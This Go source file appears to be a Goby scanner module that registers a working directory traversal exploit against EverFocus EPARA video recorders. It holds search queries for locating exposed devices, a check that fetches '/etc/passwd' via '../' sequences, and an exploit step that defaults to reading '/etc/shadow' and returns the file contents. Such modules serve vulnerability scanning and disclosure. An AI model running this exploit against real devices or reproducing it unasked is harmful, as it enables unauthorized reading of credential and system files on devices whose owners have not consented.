package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "EVERFOCUS  EPARA Directory Traversal",
    "Description": "<p>The EPARA series recorders feature many high performance recording features. H.264 compression, support for multiple independent monitors and call monitors, as well as Pentaplex operation, synchronous mainstreaming, free DDNS support and a user-friendly GUI. Features 3GPP mobile surveillance support, eSATA support, multiple control inputs, built-in DVR time recording calculator, Gigabit Ethernet interface and multi-language support. On-screen PTZ control, fast archiving, watermarking capabilities and built-in web interface for remote configuration.</p><p>Directory traversal (also known as directory traversal/path traversal) is achieved by using . / etc. directory control sequences or absolute paths to files to access arbitrary files and directories stored on the file system, especially application source code, configuration files, important system files, etc.</p>",
    "Impact": "EVERFOCUS  EPARA Directory Traversal",
    "Recommendation": "<p>1. blocking access to the external network</p><p>2. can be mitigated by waf etc</p>",
    "Product": "EVERFOCUS EPARA",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "EVERFOCUS EPARA 录像机目录穿越漏洞",
            "Description": "<p>EPARA系列录像机具有许多高性能记录功能。H.264压缩方式，支持多个独立的监视器和通话监视器，以及Pentaplex操作，同步主流，免费DDNS支持和用户友好的GUI。 具有 3GPP 移动监控支持、eSATA 支持、多个控制输入、内置 DVR 时间记录计算器、千兆以太网接口和多语言支持。屏幕 PTZ 控制、快速存档、水印功能和内置 Web 界面远程配置。<br></p><p><span style=\"color: rgb(64, 64, 64); font-size: 16px;\">目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用&nbsp;</span><code class=\"docutils literal notranslate\">../</code><span style=\"color: rgb(64, 64, 64); font-size: 16px;\">&nbsp;等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</span><br></p>",
            "Impact": "<p><span style=\"font-size: 16px; color: rgb(64, 64, 64);\">通过使用&nbsp;</span><code class=\"docutils literal notranslate\">../</code><span style=\"font-size: 16px; color: rgb(64, 64, 64);\">&nbsp;等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</span><br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">1、禁止外网访问</span><br></p><p>2、可以通过waf等缓解</p>",
            "Product": "EVERFOCUS EPARA",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "EVERFOCUS  EPARA Directory Traversal",
            "Description": "<p>The EPARA series recorders feature many high performance recording features. H.264 compression, support for multiple independent monitors and call monitors, as well as Pentaplex operation, synchronous mainstreaming, free DDNS support and a user-friendly GUI. Features 3GPP mobile surveillance support, eSATA support, multiple control inputs, built-in DVR time recording calculator, Gigabit Ethernet interface and multi-language support. On-screen PTZ control, fast archiving, watermarking capabilities and built-in web interface for remote configuration.</p><p>Directory traversal (also known as directory traversal/path traversal) is achieved by using . / etc. directory control sequences or absolute paths to files to access arbitrary files and directories stored on the file system, especially application source code, configuration files, important system files, etc.</p>",
            "Impact": "EVERFOCUS  EPARA Directory Traversal",
            "Recommendation": "<p>1. blocking access to the external network</p><p>2. can be mitigated by waf etc</p>",
            "Product": "EVERFOCUS EPARA",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "header=\"EPARA264-16X4\" || header=\"EPARA16D3\" || header=\"EPARA264-32X4\"||header=\"EPARA264-16X1\"",
    "GobyQuery": "header=\"EPARA264-16X4\" || header=\"EPARA16D3\" || header=\"EPARA264-32X4\"||header=\"EPARA264-16X1\"",
    "Author": "732903873@qq.com",
    "Homepage": "https://www.everfocus.com/",
    "DisclosureDate": "2022-04-03",
    "References": [
        "none"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.80",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "../../../../../../etc/shadow",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10368"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/../../../../../../etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
				return resp.StatusCode == 200 && regexp.MustCompile("root:.*:0:0:").MatchString(resp.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
